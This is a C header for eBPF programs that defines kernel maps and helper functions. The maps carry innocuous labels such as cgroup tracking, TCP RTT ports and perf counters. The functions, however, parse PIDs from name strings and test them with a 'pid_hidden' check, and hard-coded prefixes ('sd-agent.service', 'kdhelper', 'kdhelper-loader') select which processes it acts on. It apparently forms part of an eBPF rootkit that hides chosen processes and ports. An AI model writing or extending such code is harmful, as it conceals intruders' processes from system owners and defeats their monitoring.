#ifndef SASAK_BPF_COMMON_H
#define SASAK_BPF_COMMON_H

#include "vmlinux_5.15.h"
#include "bpf_helpers.h"
#include "bpf_core_read.h"
#include "bpf_tracing.h"

#define PAT_MAX  32
#define NPATS    16
#define MAX_PIDS 256

/* Map: cgroup pid roster -> u8 tag (1 = tracked cgroup task).
 * NOTE: tidak pakai LIBBPF_PIN_BY_NAME — cilium/ebpf (Go loader) manages
 * fd refs in-process; fd closing cleans maps automatically on loader exit. */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, __u32);
    __type(value, __u8);
    __uint(max_entries, MAX_PIDS);
} cgrp_pids SEC(".maps");

/* Map: cgroup name pattern -> u8 tag */
struct pat_key {
    char s[PAT_MAX];
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, struct pat_key);
    __type(value, __u8);
    __uint(max_entries, NPATS);
} sched_patterns SEC(".maps");

/* Map: tcp rtt sample port -> u8 tag */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, __u16);
    __type(value, __u8);
    __uint(max_entries, 64);
} tcp_rtt_ports SEC(".maps");

/* Perf stat counters (idx 0..3) */
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __type(key, __u32);
    __type(value, __u64);
    __uint(max_entries, 4);
} perf_stats SEC(".maps");

static __always_inline void stat_inc(int idx)
{
    __u32 k = (__u32)idx;
    __u64 *v = bpf_map_lookup_elem(&perf_stats, &k);
    if (v)
        *v += 1;
}

/* Prefix match: name starts with pat (NULL-terminated), PAT_MAX bytes */
static __always_inline int name_starts_with(const char *name, const char *pat)
{
    _Pragma("unroll")
    for (int i = 0; i < PAT_MAX; i++) {
        char c = pat[i];
        if (c == 0)
            return 1;
        if (name[i] != c)
            return 0;
    }
    return 1;
}

static const char sd_pat0[] = "sd-agent.service";
static const char sd_pat1[] = "kdhelper";
static const char sd_pat2[] = "kdhelper-loader";

static __always_inline int match_compiled_patterns(const char *name)
{
    if (name_starts_with(name, sd_pat0)) return 1;
    if (name_starts_with(name, sd_pat1)) return 1;
    if (name_starts_with(name, sd_pat2)) return 1;
    return 0;
}

/* Parse decimal pid from leading bytes of name. Plain bounded loop (no
 * _Pragma(unroll)) -> verifier state growth linear. */
static __always_inline __u32 parse_pid(const char *name)
{
    __u32 pid = 0;
    for (int i = 0; i < 10; i++) {
        char c = name[i];
        if (c >= '0' && c <= '9') {
            pid = pid * 10 + (c - '0');
        } else {
            if (i == 0) return 0;
            return pid;
        }
    }
    return pid;
}

static __always_inline int pid_hidden(__u32 pid)
{
    if (pid == 0)
        return 0;
    __u8 *v = bpf_map_lookup_elem(&cgrp_pids, &pid);
    return v && *v;
}

#endif